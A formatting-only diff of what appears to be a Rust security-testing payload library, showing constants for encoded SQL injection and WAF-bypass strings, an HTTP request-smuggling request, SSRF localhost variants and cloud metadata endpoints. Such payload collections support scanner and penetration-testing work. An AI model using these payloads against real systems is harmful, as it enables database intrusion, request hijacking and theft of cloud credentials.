@@ -51,11 +51,11 @@ pub mod sql_injection {
 
     /// Encoded SQL injection (WAF bypass)
     pub const ENCODED: &[&str] = &[
-        "%27%20OR%20%271%27=%271",                     // ' OR '1'='1
-        "%27%20UNION%20SELECT%20NULL--",              // ' UNION SELECT NULL--
-        "0x27204f52202731273d2731",                   // ' OR '1'='1 (hex)
-        "/**/UNION/**/SELECT/**/NULL--",             // Comment bypass
-        "UN/**/ION/**/SE/**/LECT/**/NULL--",         // Inline comment split
+        "%27%20OR%20%271%27=%271",                         // ' OR '1'='1
+        "%27%20UNION%20SELECT%20NULL--",                   // ' UNION SELECT NULL--
+        "0x27204f52202731273d2731",                        // ' OR '1'='1 (hex)
+        "/**/UNION/**/SELECT/**/NULL--",                   // Comment bypass
+        "UN/**/ION/**/SE/**/LECT/**/NULL--",               // Inline comment split
         "%ef%bc%87%20OR%20%ef%bc%871%ef%bc%87=%ef%bc%871", // Unicode bypass
     ];
 
@@ -285,8 +285,7 @@ pub mod request_smuggling {
     ];
 
     /// TE.TE (Obfuscated Transfer-Encoding)
-    pub const TE_TE: &[&[u8]] = &[
-        b"POST / HTTP/1.1\r\n\
+    pub const TE_TE: &[&[u8]] = &[b"POST / HTTP/1.1\r\n\
           Host: example.com\r\n\
           Content-Length: 4\r\n\
           Transfer-Encoding: chunked\r\n\
@@ -296,8 +295,7 @@ pub mod request_smuggling {
           Content-Type: application/x-www-form-urlencoded\r\n\
           Content-Length: 15\r\n\r\n\
           x=1\r\n\
-          0\r\n\r\n",
-    ];
+          0\r\n\r\n"];
 }
 
 /// CRLF Injection payloads
@@ -327,9 +325,9 @@ pub mod ssrf {
         "http://localhost",
         "http://0.0.0.0",
         "http://[::1]",
-        "http://0177.0.0.1",        // Octal
-        "http://0x7f.0.0.1",        // Hex
-        "http://2130706433",        // Decimal
+        "http://0177.0.0.1", // Octal
+        "http://0x7f.0.0.1", // Hex
+        "http://2130706433", // Decimal
         "http://127.1",
         "http://127.0.1",
         "http://0",
@@ -337,10 +335,10 @@ pub mod ssrf {
 
     /// Cloud metadata endpoints
     pub const CLOUD_METADATA: &[&str] = &[
-        "http://169.254.169.254/latest/meta-data/",           // AWS
-        "http://169.254.169.254/computeMetadata/v1/",         // GCP
-        "http://169.254.169.254/metadata/instance",           // Azure
-        "http://100.100.100.200/latest/meta-data/",           // Alibaba
+        "http://169.254.169.254/latest/meta-data/",   // AWS
+        "http://169.254.169.254/computeMetadata/v1/", // GCP
+        "http://169.254.169.254/metadata/instance",   // Azure
+        "http://100.100.100.200/latest/meta-data/",   // Alibaba
         "http://169.254.169.254/openstack/latest/meta_data.json", // OpenStack
     ];
 
